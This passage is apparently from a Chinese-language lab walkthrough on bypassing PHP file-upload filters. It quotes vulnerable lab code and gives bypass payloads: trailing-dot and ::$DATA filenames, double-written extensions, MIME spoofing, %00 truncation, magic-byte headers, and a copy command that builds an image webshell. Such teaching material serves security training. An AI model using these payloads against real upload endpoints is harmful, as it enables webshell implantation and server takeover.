        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>windows会对文件中的点进行自动去除，所以可以在文件末尾加点绕过，不再赘述。<br>::$DATA绕过</p>
<p>同windows特性，可在后缀名中加” ::$DATA”绕过，不再赘述。</p>
<p>路径拼接绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里对文件名进行了处理，删除了文件名末尾的点，并且把处理过的文件名拼接到路径中。<br>绕过方法</p>
<p>这里我们可以构造文件名1.PHP. . （点+空格+点），经过处理后，文件名变成1.PHP.，即可绕过。</p>
<p>双写绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>绕过方法</p>
<p>这里我们可以看到将文件名替换为空，我们可以采用双写绕过：1.pphphp</p>
<p>白名单</p>
<p>MIME检查</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>绕过方法</p>
<p>这里检查Content-type，我们burp抓包修改即可绕过：</p>
<p>%00 截断</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>$img_path直接拼接，因此可以利用%00截断绕过<br>绕过方法</p>
<p>然后直接访问&#x2F;upload&#x2F;1.php即可</p>
<p>00截断（post）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传失败"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。<br>绕过方法</p>
<p>接下来访问1.php即可</p>
<p>文件内容检查</p>
<p>文件幻数检测</p>
<p>主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下，<br>要绕过jpg 文件幻数检测就要在文件开头写上下图的值：</p>
<p>Value &#x3D; FF D8 FF E0 00 10 4A 46 49 46</p>
<p>要绕过gif 文件幻数检测就要在文件开头写上下图的值</p>
<p>Value &#x3D; 47 49 46 38 39 61<br>要绕过png 文件幻数检测就要在文件开头写上下面的值</p>
<p>Value &#x3D; 89 50 4E 47</p>
<p>然后在文件幻数后面加上自己的一句话木马代码就行了</p>
<p>文件相关信息检测</p>
<p>图像文件相关信息检测常用的就是getimagesize()函数</p>
<p>只需要把文件头部分伪造好就ok 了，就是在幻数的基础上还加了一些文件信息</p>
<p>有点像下面的结构</p>
<pre><code>GIF89a
(...some binary data for image...)
&lt;?php phpinfo(); ?&gt;
(... skipping the rest of binary data ...)
</code></pre>
<p>本次环境中的文件头检测，getimagesize，php_exif都可以用图片马绕过：</p>
<p>copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg</p>
<p>文件加载检测</p>
<p>一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，甚至是进行二次渲染（过滤效果几乎最强）。对渲染&#x2F;加载测试的攻击方式是代码注入绕过，对二次渲染的攻击方式是攻击文件加载器自身。</p>
<p>对渲染&#x2F;加载测试攻击- 代码注入绕过</p>
<p>可以用图像处理软件对一张图片进行代码注入</p>
<p>用winhex 看数据可以分析出这类工具的原理是</p>
